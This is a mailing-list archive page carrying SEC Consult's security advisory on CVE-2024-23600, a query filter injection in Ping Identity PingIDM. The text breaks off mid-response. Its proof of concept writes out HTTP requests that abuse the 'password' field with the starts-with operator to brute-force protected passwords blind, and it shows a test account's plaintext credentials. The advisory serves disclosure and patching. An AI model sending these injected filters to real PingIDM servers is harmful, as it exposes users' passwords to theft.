---
title: SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)
url: https://seclists.org/fulldisclosure/2024/Oct/18
source: Full Disclosure
date: 2024-11-01
fetch_date: 2025-10-06T19:21:11.337212
---

# SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](17)
[By Date](date.html#18)
[![Next](/images/right-icon-16x16.png)](19)

[![Previous](/images/left-icon-16x16.png)](17)
[By Thread](index.html#18)
[![Next](/images/right-icon-16x16.png)](19)

![](/shared/images/nst-icons.svg#search)

# SEC Consult SA-20241030-0 :: Query Filter Injection in Ping Identity PingIDM (formerly known as ForgeRock Identity Management) (CVE-2024-23600)

---

*From*: SEC Consult Vulnerability Lab via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 30 Oct 2024 09:57:55 +0000

---

```
SEC Consult Vulnerability Lab Security Advisory < 20241030-0 >
=======================================================================
              title: Query Filter Injection
            product: Ping Identity PingIDM (formerly known as ForgeRock Identity
                     Management)
 vulnerable version: v7.0.0 - v7.5.0 (and older unsupported versions)
      fixed version: various patches; v8.0
         CVE number: CVE-2024-23600
             impact: medium
           homepage: https://backstage.forgerock.com/docs/idm
              found: 2024-04-10
                 by: Ksandros Apostoli
                     Miguel García Martín
                     SEC Consult Vulnerability Lab

                     An integrated part of SEC Consult, an Eviden business
                     Europe | Asia

                     https://www.sec-consult.com

=======================================================================

Vendor description:
-------------------
"ForgeRock Identity Management (IDM) software provides centralized, simple
management and synchronization of identities for users, devices, and things.
IDM software is highly flexible and therefore able to fit almost any use case
and workflow."

Source: https://backstage.forgerock.com/docs/idm/7.5/release-notes/preface.html

"The combination of Ping Identity and ForgeRock is ushering in a very exciting
time in the identity market. Together, our market-leading identity services will
deliver more choice, unparalleled expertise, and a more complete identity
solution for our customers and partners. We're incredibly excited to welcome
you all to the future of identity."

Source: https://www.pingidentity.com/en/lp/pingandforgerock.html

Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Query Filter Injection (CVE-2024-23600)
Ping Identity PingIDM (formerly known as ForgeRock Identity Management) versions
7.5.0 and below, enabled an attacker with read access to the "User" collection,
to abuse API query filters in order to obtain managed and/or internal user's
passwords in either plaintext or encrypted variants, based on configuration.
The API clearly prevents the password in either plaintext or encrypted to be
retrieved by any other means, as this field is set as protected under the
"User" object.

However, by injecting a malicious query filter, using "password" as the field to
be filtered, an attacker can perform a blind brute-force on any victim's user
password details (encrypted object or plaintext string).

This blind brute-force can be very efficiently conducted since the query filtering
supported by the PingIDM API supports versatile operators such as Starts-With ('sw')
or Contains ('co') etc. The sole limitation in this approach is case-insensitivity
in the above-described filters adding an additional guessing overhead.

The issue potentially extends to all protected fields of custom or built-in
collections, but this remains to be tested.

Proof of concept:
-----------------
1) Query Filter Injection (CVE-2024-23600)
Two proof of concepts will be provided, one for version 7.3.0 and one for 7.5.0.

PoC 1 - PingIDM (v7.3.0) - configured to store plaintext user passwords
In the vulnerable instance running in this example (version 7.3.0), SEC Consult
created a test user with the following credentials: `secUser1:aAqQ1234!`.
A benign query filter in PingIDM can be crafted from the administrative
UI to filter, for example, users by their username (the password field is not
presented as available for filtering in the UI):

HTTP Request
```
GET /openidm/managed/user?_queryFilter=userName+sw+"sec" HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: https://$HOST/api/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:05:13 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 534
Cache-Control: no-store
Content-Security-Policy: default-src 'none';frame-ancestors 'none';sandbox
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
Expires: 0
Pragma: no-cache
Set-Cookie: session-jwt=[redacted]
Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=15724800; includeSubDomains
X-Forgerock-Transactionid: 4261c9f68aa23e492ad57a19973188a9

{
    "result": [
        {
            "_id": "0a0f9700-1f7e-498c-967d-b24a0b3ab301",
            "_rev": "0cc5575b-ce37-47c1-9beb-408b477c924e-1665022",
            "userName": "secUser1",
            "accountStatus": "active",
            "postalCode": "8046",
            "stateProvince": "ZH",
            "postalAddress": "Flurstrasse",
            "description": "Pentest User 1",
            "country": "CH",
            "city": "Zurich",
            "givenName": "SEC",
            "sn": "Consult",
            "mail": "secuser1 () sec-consult com",
            "preferences": {
                "updates": true,
                "marketing": false
            }
        }
    ],
    "resultCount": 1,
    "pagedResultsCookie": null,
    "totalPagedResultsPolicy": "NONE",
    "totalPagedResults": -1,
    "remainingPagedResults": -1
}
```

Note in the request/response pair above, that the query filter sent over the
presented API request was used to query all users with 'userName' starting
('sw') with the string "sec". As expected the test user 'secUser1'
was returned. In addition, observe that the password field is never to be
returned in any form (plaintext or encrypted) by the API.

Despite not being available for filtering in either the UI or API documentation,
the 'password' field can be used instead of 'userName' in the example above
to query users based on their password. In case the PingIDM instance has been
configured to store user passwords persistently in plaintext, it can be queried
directly as shown in the request below:

HTTP Request
```
GET /openidm/managed/user?_queryFilter=password+sw+"a" HTTP/2
Host: $HOST
Cookie: route=1712737028.694.31674.440043|b75f0b2274c1023ba864392bb04e5ca3; i18next=en-us; session-jwt=[redacted]
Accept-Api-Version: resource=1.0
Accept: application/json
Referer: https://$HOST/api/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
```

HTTP Response
```
HTTP/2 200 OK
Date: Wed, 10 Apr 2024 13:07:17 GMT
Content-Type: application/json;charset=utf-8
Content-Length: 534
Cache-Control: no-store
Conte...